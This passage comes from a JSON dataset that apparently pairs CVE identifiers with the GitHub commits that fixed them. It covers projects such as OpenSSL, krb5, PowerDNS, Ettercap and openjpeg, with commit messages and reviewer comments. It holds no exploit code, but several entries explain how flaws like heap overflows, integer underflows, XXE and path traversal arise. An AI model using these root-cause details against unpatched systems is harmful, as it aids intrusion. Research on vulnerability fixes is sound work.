[...java/com/hazelcast/config/SerializationConfig.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9jb25maWcvU2VyaWFsaXphdGlvbkNvbmZpZy5qYXZh) | `89.02% <100%> (+0.41%)` | `43 <2> (+2)` | :arrow_up: |\n| [...rc/main/java/com/hazelcast/config/ClassFilter.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9jb25maWcvQ2xhc3NGaWx0ZXIuamF2YQ==) | `52.83% <52.83%> (\u00f8)` | `17 <17> (?)` | |\n| [...azelcast/config/JavaSerializationFilterConfig.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9jb25maWcvSmF2YVNlcmlhbGl6YXRpb25GaWx0ZXJDb25maWcuamF2YQ==) | `53.84% <53.84%> (\u00f8)` | `8 <8> (?)` | |\n| [...elcast/src/main/java/com/hazelcast/nio/IOUtil.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9uaW8vSU9VdGlsLmphdmE=) | `73.12% <66.66%> (-0.32%)` | `78 <1> (\u00f8)` | |\n| [.../com/hazelcast/config/AbstractXmlConfigHelper.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0L3NyYy9tYWluL2phdmEvY29tL2hhemVsY2FzdC9jb25maWcvQWJzdHJhY3RYbWxDb25maWdIZWxwZXIuamF2YQ==) | `70.41% <86.95%> (+1.66%)` | `71 <6> (+7)` | :arrow_up: |\n| [.../spring/AbstractHazelcastBeanDefinitionParser.java](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree#diff-aGF6ZWxjYXN0LXNwcmluZy9zcmMvbWFpbi9qYXZhL2NvbS9oYXplbGNhc3Qvc3ByaW5nL0Fic3RyYWN0SGF6ZWxjYXN0QmVhbkRlZmluaXRpb25QYXJzZXIuamF2YQ==) | `86.82% <88.46%> (+0.46%)` | `1 <0> (\u00f8)` | :arrow_down: |\n| ... and [119 more](https://codecov.io/gh/hazelcast/hazelcast/pull/12230/diff?src=pr&el=tree-more) | |\n Thanks @pveentjer for review and pushing for the solution with better performance!\r\n\r\nI'm going to squash the commits.",
            "pr_title_words": 10,
            "comments_words": 511,
            "total_other_info_words": 521
        },
        {
            "cve-id": "CVE-2016-10210",
            "commit_url": "https://github.com/VirusTotal/yara/commit/3119b232c9c453c98d8fa8b6ae4e37ba18117cd4",
            "commit_msg": "re_lexer: Make reading escape sequences more robust (#586)\n\n* Add test for issue #503\r\n\r\n* re_lexer: Make reading escape sequences more robust\r\n\r\nThis commit fixes parsing incomplete escape sequences at the end of a\r\nregular expression and parsing things like \\xxy (invalid hex digits)\r\nwhich before were silently turned into (char)255.\r\n\r\nClose #503\r\n\r\n* Update re_lexer.c",
            "commit_msg_words": 56,
            "other_info": "re_lexer: Make reading escape sequences more robust",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2016-3120",
            "commit_url": "https://github.com/krb5/krb5/commit/93b4a6306a0026cf1cc31ac4bd8a49ba5d034ba7",
            "commit_msg": "Fix S4U2Self KDC crash when anon is restricted\n\nIn validate_as_request(), when enforcing restrict_anonymous_to_tgt,\nuse client.princ instead of request->client; the latter is NULL when\nvalidating S4U2Self requests.\n\nCVE-2016-3120:\n\nIn MIT krb5 1.9 and later, an authenticated attacker can cause krb5kdc\nto dereference a null pointer if the restrict_anonymous_to_tgt option\nis set to true, by making an S4U2Self request.\n\n  CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C\n\nticket: 8458 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next",
            "commit_msg_words": 67,
            "other_info": "Fix S4U2Self KDC crash when anon is restricted This looks ok to me.",
            "pr_title_words": 8,
            "comments_words": 5,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2016-5426",
            "commit_url": "https://github.com/PowerDNS/pdns/commit/881b5b03a590198d03008e4200dd00cc537712f3",
            "commit_msg": "Reject qname's wirelength > 255, `chopOff()` handle dot inside labels",
            "commit_msg_words": 10,
            "other_info": "Reject qname's wirelength > 255, `chopOff()` handle dot inside labels",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2016-6172",
            "commit_url": "https://github.com/PowerDNS/pdns/commit/a014f4c224a7b21f1c648257d1fd1128413129aa",
            "commit_msg": "Add limits to the size of received AXFR, in megabytes\n\nThis prevents resource exhaustion in case the master is sending a\nvery large amount of data in an update.",
            "commit_msg_words": 29,
            "other_info": "Add limits to the size of received AXFR, in megabytes Fixes #4128 for 3.4.x.\n LGTM. pdns.xml edit is useless, 3.x docs are built from markdown on the docs-3X branch.",
            "pr_title_words": 10,
            "comments_words": 19,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2016-10156",
            "commit_url": "https://github.com/systemd/systemd/commit/ee735086f8670be1591fa9593e80dd60163a7a2f",
            "commit_msg": "util-lib: use MODE_INVALID as invalid value for mode_t everywhere",
            "commit_msg_words": 9,
            "other_info": "Dependency engine improvements EXTRACT_RETAIN_ESCAPE looks good to me.\n\nI was working on the support for backticks and I came up with something similar for variables and specifiers: https://github.com/filbranden/systemd/commit/6fda28ec6d47d928588c9f24d6028cd746895a68\n\nI like your \"retain\" name so I might use something similar over there too...",
            "pr_title_words": 3,
            "comments_words": 39,
            "total_other_info_words": 42
        },
        {
            "cve-id": "CVE-2016-6305",
            "commit_url": "https://github.com/openssl/openssl/commit/63658103d4441924f8dbfc517b99bb54758a98b9",
            "commit_msg": "Fix a hang with SSL_peek()\n\nIf while calling SSL_peek() we read an empty record then we go into an\ninfinite loop, continually trying to read data from the empty record and\nnever making any progress. This could be exploited by a malicious peer in\na Denial Of Service attack.\n\nCVE-2016-6305\n\nGitHub Issue #1563\n\nReviewed-by: Rich Salz <rsalz@openssl.org>",
            "commit_msg_words": 57,
            "other_info": "Open ssl 1 1 0 stable Fixed the above nits, and removed ifdefs for OPENSSL_NO_SERVERINFO.\n\nRegarding the FIXME in ssl_rsa.c: it would be possible to do extra checking for known types, like SignedCertificateTimestamps, but you could probably do that more easily than me.\n\nNote that OPENSSL_NO_TLSEXT doesn't actually compile (not the fault of this patch), and the 5878 authz code is still left in.  These things should probably change, I'd be happy to work on them after this gets in. \n Merged, with modifications.",
            "pr_title_words": 6,
            "comments_words": 77,
            "total_other_info_words": 83
        },
        {
            "cve-id": "CVE-2016-9177",
            "commit_url": "https://github.com/perwendel/spark/commit/26b57d0596ee73c14c558463943ef0857e53b91f",
            "commit_msg": "Fix for #700 - Arbitrary File Read Vulnerability",
            "commit_msg_words": 8,
            "other_info": "Fix for #700 - Arbitrary File Read Vulnerability I've just verified it for Windows, didn't have time to test for linux etc.\nWhen travis CI built it didn't detect directory traversal for the test case for external resources. There's probably an issue with how path handling differs in unix-like OSs and windows.\n DISCLAIMER: Didn't really have time to look closely, so I could be talking out of my arse so to speak, but: wouldn't using `File.getCanonicalPath()` be safer than string manipulation? I'd certainly trust JDK library methods more than my own code, especially when it comes to security. Also, there are all kinds of clever ways (encodings, escapes and what not) of defeating checking strings for \"..\", \"/\", \"\\\" etc.\n @jakaarl Sorry, merged before I saw your comment. The guy making the post emailed and said it was a good solution. But I'll follow your advise and see if I can make it better. New PR will be created if you're right!",
            "pr_title_words": 8,
            "comments_words": 154,
            "total_other_info_words": 162
        },
        {
            "cve-id": "CVE-2016-7043",
            "commit_url": "https://github.com/kiegroup/droolsjbpm-integration/commit/e916032edd47aa46d15f3a11909b4804ee20a7e8",
            "commit_msg": "[RHBMS-4312] Loading pasword from a keystore",
            "commit_msg_words": 6,
            "other_info": "[RHBMS-4312] Loading pasword from a keystore Jenkins retest this @rstancel this now has conflicts, could you please resolve",
            "pr_title_words": 6,
            "comments_words": 12,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2016-9941",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/5418e8007c248bf9668d22a8c1fa9528149b69f2",
            "commit_msg": "Fix heap overflows in the various rectangle fill functions\n\nAltough rfbproto.c does check whether the overall FramebufferUpdate rectangle is\ntoo large, some of the individual encoding decoders do not, which allows a\nmalicious server to overwrite parts of the heap.",
            "commit_msg_words": 40,
            "other_info": "Fix two heap buffer overflows I cannot get the PoC to run on Debian. Do you know which package to install to get lzo for python3? The other way around, it finds lzo with python2, but then asyncio is not available :-/\n I installed the python3 version directly from pip (https://pypi.python.org/pypi/python-lzo/1.08) (as it is not available in Gentoo repositories either).\n Tested && merged. Thanks a lot! I have been told that it is a good practice to report things like this as CVEs. Do you plan to do that or should I? I see that there are already some libvncserver/libvcnclient CVEs on the [list](http://www.cvedetails.com/product/8258/Libvncserver-Libvncserver.html?vendor_id=4842). If you could take care of that, I'd be very thankful indeed. Do you plan on doing a release any time soon? It probably would be useful to have a new version the CVE can refer to as fixed. Am Tue, 13 Dec 2016 12:34:15 -0800\nschrieb Josef Gajdusek <notifications@github.com>:\n\n> Do you plan on doing a release any time soon? It probably would be useful to\n> have a new version the CVE can refer to as fixed.\n> \n\nYes. 0.9.11 is due before x-mas.",
            "pr_title_words": 5,
            "comments_words": 185,
            "total_other_info_words": 190
        },
        {
            "cve-id": "CVE-2016-6555",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/29007e7aeeb792aa73d45fafb16ae9ef19e78a18",
            "commit_msg": "Follow-on work for NMS-8722\n\n- Don't break the IMG tag, break its ONERROR attribute\n- Fix and update WebSecurityUtils unit tests",
            "commit_msg_words": 21,
            "other_info": "NMS-8722: XSS vulnerability in display of SNMP sysName and trap varbind values Did we also intend to escape the SNMP attributes on the node.jsp page?",
            "pr_title_words": 12,
            "comments_words": 13,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2016-15026",
            "commit_url": "https://github.com/3breadt/dd-plist/commit/8c954e8d9f6f6863729e50105a8abf3f87fff74c",
            "commit_msg": "1) Take steps to guard against external XXE attacks (except, note that <!DOCTYPE> cannot be disabled in XML plists).\n2) Resolve the actual PLIST DTD from inside the JAR file itself, and prevent resolution of other external XML resources.\n3) Make XMLPlistParser.getDocBuilder public",
            "commit_msg_words": 43,
            "other_info": "Protect XML parsing against XXE attacks and load DTD from JAR First of all, I greatly appreciate your effort to make this library more secure.\n\n_Regarding 1)_\n\nThe code, especially setting the features, needs to be tested under Android because it uses a different DocumentBuilder implementation than the Oracle JRE. And so far this library has remained Android compatible. Have you done this?\n\n_Regarding 2)_\n\nI would not redistribute the DTD which originates from http://www.apple.com/DTDs/PropertyList-1.0.dtd and thus may be copyrighted by Apple Inc.\nThat is why the current DocumentBuilder uses an EntityResolver which returns an empty input stream.\n\nAs DTD validation is anyway disabled I see no reason to change that behavior. Or does this in any way compromise the fix against XXE attacks?\n Fair enough, I haven't tested whether these properties work on Android.  I could wrap each in a try/catch block in case they're not supported.  And I understand your copyright concern, I guess it's not strictly necessary to have there anyway unless one wants to validate the XML document.  I'll update this PR.\n Sounds good, thanks!",
            "pr_title_words": 11,
            "comments_words": 168,
            "total_other_info_words": 179
        },
        {
            "cve-id": "CVE-2016-1709",
            "commit_url": "https://github.com/googlefonts/sfntly/commit/c56b85408bab232efd7e650f0994272a174e3b92",
            "commit_msg": "Add a bounds check to ByteArray::Get().",
            "commit_msg_words": 6,
            "other_info": "Add a bounds check to ByteArray::Get(). Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n\n:memo: **Please visit https://cla.developers.google.com/ to sign.**\n\nOnce you've signed, please reply here (e.g. `I signed it!`) and we'll verify.  Thanks.\n\n---\n- If you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check [your existing CLA data](https://cla.developers.google.com/clas) and verify that your [email is set on your git commits](https://help.github.com/articles/setting-your-email-in-git/).\n- If you signed the CLA as a corporation, please let us know the company's name.\n\n<!-- need_sender_cla -->",
            "pr_title_words": 6,
            "comments_words": 115,
            "total_other_info_words": 121
        },
        {
            "cve-id": "CVE-2016-4425",
            "commit_url": "https://github.com/akheron/jansson/commit/64ce0ad3731ebd77e02897b07920eadd0e2cc318",
            "commit_msg": "Fix for issue #282\n\nThe fix limits recursion depths when parsing arrays and objects.\nThe limit is configurable via the `JSON_PARSER_MAX_DEPTH` setting\nwithin `jansson_config.h` and is set by default to 2048.\n\nUpdate the RFC conformance document to note the limit; the RFC\nallows limits to be set by the implementation so nothing has\nactually changed w.r.t. conformance state.\n\nReported by Gustavo Grieco.",
            "commit_msg_words": 62,
            "other_info": "Fix for issue #282 [![Coverage Status](https://coveralls.io/builds/6025269/badge)](https://coveralls.io/builds/6025269)\n\nCoverage remained the same at 90.254% when pulling **64ce0ad3731ebd77e02897b07920eadd0e2cc318 on dev-zzo:issue-282** into **087ed94c452ecade26447c14605cd419e970cfd2 on akheron:master**.\n Merged, thanks a lot!\n Was happy to help.",
            "pr_title_words": 4,
            "comments_words": 25,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2016-3995",
            "commit_url": "https://github.com/weidai11/cryptopp/commit/9f335d719ebc27f58251559240de0077ec42c583",
            "commit_msg": "Fix the Rijndael timing attack counter measure",
            "commit_msg_words": 7,
            "other_info": "Fix the Rijndael timing attack counter measure Thank you very much.\n Thanks again @plestrin. We picked up the improvement you suggested at [Commit 5cce8c33cabd92af](http://github.com/weidai11/cryptopp/commit/5cce8c33cabd92afecfb0ec31f841d3082d15b3d).\n Also see [Issue 146](http://github.com/weidai11/cryptopp/issues/146).",
            "pr_title_words": 7,
            "comments_words": 21,
            "total_other_info_words": 28
        },
        {
            "cve-id": "CVE-2016-10128",
            "commit_url": "https://github.com/libgit2/libgit2/commit/4ac39c76c0153d1ee6889a0984c39e97731684b2",
            "commit_msg": "smart_pkt: verify packet length exceeds PKT_LEN_SIZE\n\nEach packet line in the Git protocol is prefixed by a four-byte\nlength of how much data will follow, which we parse in\n`git_pkt_parse_line`. The transmitted length can either be equal\nto zero in case of a flush packet or has to be at least of length\nfour, as it also includes the encoded length itself. Not\nchecking this may result in a buffer overflow as we directly pass\nthe length to functions which accept a `size_t` length as\nparameter.\n\nFix the issue by verifying that non-flush packets have at least a\nlength of `PKT_LEN_SIZE`.",
            "commit_msg_words": 101,
            "other_info": "Security updates for v0.24",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2016-5157",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/e078172b1c3f98d2219c37076b238fb759c751ea",
            "commit_msg": "Add sanity check for tile coordinates (#823)\n\nCoordinates are casted from OPJ_UINT32 to OPJ_INT32\r\nAdd sanity check for negative values and upper bound becoming lower\r\nthan lower bound.\r\nSee also\r\nhttps://pdfium.googlesource.com/pdfium/+/b6befb2ed2485a3805cddea86dc7574510178ea9",
            "commit_msg_words": 31,
            "other_info": "Add sanity check for tile coordinates there was an error when referencing test data.\nNamed issue822 #822 when it should be issue823\n http://www.openwall.com/lists/oss-security/2016/09/08/8 indicates this issue was the same as CVE-2016-5157",
            "pr_title_words": 6,
            "comments_words": 25,
            "total_other_info_words": 31
        },
        {
            "cve-id": "CVE-2016-3182",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/ad593c9e0622e0d8d87228e67e4dbd36243ffd22",
            "commit_msg": "Fix heap-buffer-overflow in color_esycc_to_rgb (#748)\n\nWhen all components do not have the same dx/dy, components buffer are\r\nread beyond their end.\r\nDo not convert in this case.\r\n\r\nUpdate uclouvain/openjpeg#725",
            "commit_msg_words": 29,
            "other_info": "Fix heap-buffer-overflow in color_esycc_to_rgb",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2016-10351",
            "commit_url": "https://github.com/telegramdesktop/tdesktop/commit/388703b9ca1912a5438e37f9dd54c35805f2c594",
            "commit_msg": "Fix CVE-2016-10351: Insecure cWorkingDir permissions.\n\nSet 700 permisson on dir on every start.\n\nSigned-off-by: Alexander GQ Gerasiov <gq@cs.msu.su>",
            "commit_msg_words": 18,
            "other_info": "Fix CVE-2016-10351: Insecure cWorkingDir permissions. Thanks, that indeed should be better. This pull request has been automatically locked since there has not been any recent activity after it was closed. Please open a new issue for related bugs.",
            "pr_title_words": 5,
            "comments_words": 33,
            "total_other_info_words": 38
        }
    ],
    "2014": [
        {
            "cve-id": "CVE-2014-9379",
            "commit_url": "https://github.com/Ettercap/ettercap/commit/c2a3c99af956146570d7883e4b540b9d0c0a3c46",
            "commit_msg": "Fix radius stack overflow",
            "commit_msg_words": 4,
            "other_info": "Fix radius stack overflow Hi @NickSampanis sorry for taking so long to look at them, but I'm worried about this one.\nI don't understand why we should use uint16 if the value won't be greater than uint8.\nCan you please clarify?\n\nIf 8 bits is enough I propose to change the attr_len variable type, otherwise I propose to add a length check instead of the cast.\n\n(maybe I'm looking at the wrong problem)\n It's ok, The cves will be published shortly and some denial of service exploits too :). This bug has to do with how the c language does mathematical calculations with non int data types. C language automatically casts non int datatypes to int in order to do arithmetic  calculations. So the statement \nattr_len = *(begin + 1) - 2\n\nif the next character of the begin pointer is equal to one the result will be 0xffffffff, but because attr_len is 2 bytes it could hold only 0xffff and thats why i used the cast. Now in all my patches i am trying to wipe out the security bug without modifying the code despite what i think on how efficient is the implementation. It would be better if attr_len type is uint8 but in order to do that you should modify dissector_radius function too\n Feel free to do that :D \n Merging in the meanwhile\n I did the change, Nick, can you please check\nhttps://github.com/Ettercap/ettercap/pull/635 ? thanks!",
            "pr_title_words": 4,
            "comments_words": 234,
            "total_other_info_words": 238
        },
        {
            "cve-id": "CVE-2014-7202",
            "commit_url": "https://github.com/zeromq/libzmq/commit/77f14aad95cdf0d2a244ae9b4a025e5ba0adf01a",
            "commit_msg": "Problem: stream_engine.cpp security can be downgraded\n\nSolution: accept only the mechanism defined by the socket options.\n\nI've not tested this yet, so it's a speculative fix.",
            "commit_msg_words": 26,
            "other_info": "Problem: stream_engine.cpp security can be downgraded Fixes #1190.",
            "pr_title_words": 6,
            "comments_words": 2,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2014-7272",
            "commit_url": "https://github.com/sddm/sddm/commit/e92c466f5c324b429ce1a8aa1b40d208574c778a",
            "commit_msg": "Move onAuthenticated XAUTHORITY generation to the helper\n\nThis avoids it being created as root and then chown'd.",
            "commit_msg_words": 17,
            "other_info": "Move onAuthenticated XAUTHORITY generation to the helper Also should fix .xsession-errors being owned by root",
            "pr_title_words": 7,
            "comments_words": 8,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2014-7271",
            "commit_url": "https://github.com/sddm/sddm/commit/71b921d9304cdfae47bcd587bf0b6b1dd971c8f3",
            "commit_msg": "Never try to login as the user SDDM",
            "commit_msg_words": 8,
            "other_info": "Never try to login as the user SDDM looks a very welcome patch\n You're hardcoding sddm even though the user/group is customizable by the distro. Risky.\n so does PamBackend::start\nthough maybe that's wrong too, and should be replaced with an explicit --greeter argument.\n As far as I remember we only accept a user named sddm.\n New version uses explicit flag instead of username comparison\n I'd leave out blocking the \"sddm\" user... it could cause only minor problems to folks who already have a regular user called like that... if there are any at all. Not insisting though\n @MartinBriza That is a broken setup in our regard if they have a user the same as the sddm user.",
            "pr_title_words": 8,
            "comments_words": 109,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2014-9377",
            "commit_url": "https://github.com/Ettercap/ettercap/commit/3f0c582826095c722ab6fbf91518282a765a0b68",
            "commit_msg": "Fix nbns arbitary length heap overflow",
            "commit_msg_words": 6,
            "other_info": "Fix nbns arbitary length heap overflow",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2014-7203",
            "commit_url": "https://github.com/zeromq/libzmq/commit/0900a489213d74feb86fc0b343308fe7884a2a3c",
            "commit_msg": "Problem: curve messages can be replayed\n\nSolution: ensure message short nonces are strictly increasing and validate them",
            "commit_msg_words": 17,
            "other_info": "Problem: curve messages can be replayed Fixes #1191.",
            "pr_title_words": 6,
            "comments_words": 2,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2014-9748",
            "commit_url": "https://github.com/libuv/libuv/commit/d4ff8fd5c175bc825258da3ffb01bd21bd5a6202",
            "commit_msg": "win: fix unsavory rwlock fallback implementation\n\nBefore this patch an uv_mutex_t (backed by a critical section) could be\nreleased by a tread different from the thread that acquired it, which is\nnot allowed. This is fixed by using a semaphore instead.\n\nNote that the affected code paths were used on Windows XP and Windows\nServer 2003 only.\n\nThis is a back-port of commits 3eb6764, 1ad6ad7, 9a4fd26, 9823922\n85adf43 and bd1777f from the v1.x branch.\n\nFixes: https://github.com/libuv/libuv/issues/515\nRefs: https://github.com/libuv/libuv/pull/525\nPR-URL: https://github.com/libuv/libuv/pull/903\nReviewed-By: Ben Noordhuis <info@bnoordhuis.nl>\nReviewed-By: Bert Belder <bertbelder@gmail.com>",
            "commit_msg_words": 88,
            "other_info": "win: fix unsavory rwlock fallback implementation Windows XP \"CI\"\n![Imgur](http://i.imgur.com/qD71muU.png)\n\nSome tests fail (as thy were before) but the added one passes.\n Newer Windows CI: https://ci.nodejs.org/view/libuv/job/libuv-test-commit-windows/73/\n Notes: I had to backport https://github.com/libuv/libuv/pull/535 as well, to make the test pass. The test was also adapted because in 0.10 we returned -1 not real errors.\n\n/cc @bnoordhuis @piscisaureus @rvagg\n Windows 7 results:\n\n```\n[%  96|+ 182|-   7|T   1|S   0]: thread_mutex\n[%  96|+ 183|-   7|T   1|S   0]: thread_rwlock\n[%  97|+ 184|-   7|T   1|S   0]: thread_rwlock_trylock\n```\n\nAs far as I'm concerned, we are good to go.\n LGTM at a quick glance.\n LGTM",
            "pr_title_words": 6,
            "comments_words": 93,
            "total_other_info_words": 99
        },
        {
            "cve-id": "CVE-2014-9376",
            "commit_url": "https://github.com/Ettercap/ettercap/commit/afe7061948e85f0a0fd417d5e4c681bfaf212f42",
            "commit_msg": "Fix get_decode_len ignored strlen return value",
            "commit_msg_words": 6,
            "other_info": "Fix cvs signed pointer get_decode_len may return negative value which leads to huge allocation and denial of service",
            "pr_title_words": 4,
            "comments_words": 14,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2014-0236",
            "commit_url": "https://github.com/php/php-src/commit/f3f22ff5c697aef854ffc1918bce708b37481b0f",
            "commit_msg": "Fixed bug #67329 fileinfo: NULL pointer deference flaw by processing certain CDF files",
            "commit_msg_words": 13,
            "other_info": "fix SOAP for uninitialzed object",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2014-8002",
            "commit_url": "https://github.com/cisco/openh264/commit/1ec213d5a7d8a1b0ee7ca4f00c725e53c2e38e66",
            "commit_msg": "stop early error for parse/recon MB",
            "commit_msg_words": 6,
            "other_info": "stop early error for parse/recon MB Archiving from https://rbcommons.com/s/OpenH264/r/614/\n\n----\n**testing_done**:  done.\n**description**:  should not absolutely recon a MB. make protection first.\n\n----\n\n----\n\n----\n reviewer dong zhang (dongzhang) \n time 2014-07-08T04:47:42+00:00 \n2014-07-08T04:47:42+00:00 dong zhang (dongzhang):\n>Ship It!\nShip It!\nShip it!\n\n\n----\n\n----\n\nFinish archiving from https://rbcommons.com/s/OpenH264/r/614/",
            "pr_title_words": 6,
            "comments_words": 41,
            "total_other_info_words": 47
        },
        {
            "cve-id": "CVE-2014-9906",
            "commit_url": "https://github.com/perl5-dbi/DBD-mysql/commit/a56ae87a4c1c1fead7d09c3653905841ccccf1cc",
            "commit_msg": "fix use-after-free crash in RT #97625",
            "commit_msg_words": 6,
            "other_info": "fix use-after-free crash in RT #97625 On 11/20/14 15:41, Patrick Galbraith wrote:\n\n> Merged #28 https://github.com/perl5-dbi/DBD-mysql/pull/28.\n> \n> \u2014\n> Reply to this email directly or view it on GitHub https://github.com/perl5-dbi/DBD-mysql/pull/28#event-196176034.\n> \n> There is a conflict in the commit:\n> https://github.com/perl5-dbi/DBD-mysql/commit/283c5dfc42c530aab06ad032cf25b816c0e70780\n>  Cheers\n>   Giovanni",
            "pr_title_words": 6,
            "comments_words": 40,
            "total_other_info_words": 46
        }
    ],
    "2012": [
        {
            "cve-id": "CVE-2012-6696",
            "commit_url": "https://github.com/inspircd/inspircd/commit/ed28c1ba666b39581adb860bf51cdde43c84cc89",
            "commit_msg": "Fixed out of bounds memory access from malformed DNS queries that have an invalid length label. Introduced in a6a07de0daa353bcd29056a4535a9c4784c113c8.",
            "commit_msg_words": 19,
            "other_info": "Fixed out of bounds memory access from malformed DNS queries that have a... @nenolod, can you take a look?\n If i was increased if (i >= lowest_pos) would fail, and the parsing would stop though?\n Ah, you're right\n i'll take this as agreement that this solution is acceptable. thanks for your work guys.",
            "pr_title_words": 13,
            "comments_words": 40,
            "total_other_info_words": 53
        },
        {
            "cve-id": "CVE-2012-6119",
            "commit_url": "https://github.com/candlepin/candlepin/commit/f4d93230e58b969c506b4c9778e04482a059b08c",
            "commit_msg": "835977: Re-enable manifest signature checking.\n\nThe production/stage public candlepin certificate is now packaged in the\nRPM. This is flagged as a config file but *without* noreplace, so any\ndeployment using their own upstream cert (we don't think there are any)\nwill have to restore it from the rpmsave file that results after a\ncandlepin rpm upgrade. This was done because we expect this to be the\ndesired behavior, there is no known usecase for using your own\nupstream cert at this time.",
            "commit_msg_words": 82,
            "other_info": "835977: Re-enable manifest signature checking. :octopus: \n ACK",
            "pr_title_words": 5,
            "comments_words": 2,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2012-6697",
            "commit_url": "https://github.com/inspircd/inspircd/commit/58c893e834ff20495d007709220881a3ff13f423",
            "commit_msg": "Fixed infinite loop cauesd by invalid dns packets",
            "commit_msg_words": 8,
            "other_info": "Fixed out of bounds memory access from malformed DNS queries that have a... @nenolod, can you take a look?\n If i was increased if (i >= lowest_pos) would fail, and the parsing would stop though?\n Ah, you're right\n i'll take this as agreement that this solution is acceptable. thanks for your work guys.",
            "pr_title_words": 13,
            "comments_words": 40,
            "total_other_info_words": 53
        }
    ],
    "2010": [
        {
            "cve-id": "CVE-2010-3844",
            "commit_url": "https://github.com/Ettercap/ettercap/commit/4ef3ede30181eca9add74305ad26dbcb0c3686a0",
            "commit_msg": "More changes to mitigate:\nCVE-2010-3843\nCVE-2010-3844",
            "commit_msg_words": 6,
            "other_info": "Build system fixes",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        }
    ],
    "2013": [
        {
            "cve-id": "CVE-2013-4119",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/0773bb9303d24473fe1185d85a424dfe159aff53",
            "commit_msg": "nla: invalidate sec handle after creation\n\nIf sec pointer isn't invalidated after creation it is not possible\nto check if the upper and lower pointers are valid.\n\nThis fixes a segfault in the server part if the client disconnects before\nthe authentication was finished.",
            "commit_msg_words": 44,
            "other_info": "Misc fixes Test PASSed.\nRefer to this link for build results: https://ci.freerdp.com/job/Github%20pull%20request%20tester/140/",
            "pr_title_words": 2,
            "comments_words": 10,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2013-20001",
            "commit_url": "https://github.com/openzfs/zfs/commit/5421a04adce8465a5f9fc1a0346587404a885632",
            "commit_msg": "libshare: nfs: correctly pass through ipv6 addresses in bracket notation\n\nCloses: #11171, #1894\nSigned-off-by: Felix D\u00f6rre <felix@dogcraft.de>",
            "commit_msg_words": 17,
            "other_info": "Correclty pass through Ipv6 addresses in sharenfs @behlendorf Hi, I've found time to build/run testcases locally. I have now moved some of the testing into a new test case and in the last force-push updated only the assertions in that test case. I have run the new test-case locally and it goes through, so I am resonably sure that we shouldn't see any CI-Failure caused by the changes.\r\n\r\nI'd say that this PR is now ready for review, but I can't remove the \"Work-In-Progress\"-Label. It would be nice, if you could do that. Do you know when this pull request will make it into the official release? I see it merged in the master branch, but the code is not making in the official releases",
            "pr_title_words": 7,
            "comments_words": 118,
            "total_other_info_words": 125
        },
        {
            "cve-id": "CVE-2013-4342",
            "commit_url": "https://github.com/xinetd-org/xinetd/commit/91e2401a219121eae15244a6b25d2e79c1af5864",
            "commit_msg": "CVE-2013-4342: xinetd: ignores user and group directives for TCPMUX services\n\nOriginally reported to Debian in 2005 <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=324678> and rediscovered <https://bugzilla.redhat.com/show_bug.cgi?id=1006100>, xinetd would execute TCPMUX services without dropping privilege to match the service configuration allowing the service to run with same privilege as the xinetd process (root).",
            "commit_msg_words": 46,
            "other_info": "CVE-2013-4342: xinetd ignores user and group directives for TCPMUX services Does SUSE Linux Enterprise Server 10 SP2 is affected by the vulnerability?",
            "pr_title_words": 10,
            "comments_words": 12,
            "total_other_info_words": 22
        },
        {
            "cve-id": "CVE-2013-1915",
            "commit_url": "https://github.com/owasp-modsecurity/ModSecurity/commit/d4d80b38aa85eccb26e3c61b04d16e8ca5de76fe",
            "commit_msg": "Added SecXmlExternalEntity",
            "commit_msg_words": 2,
            "other_info": "Remotes/trunk",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2013-2139",
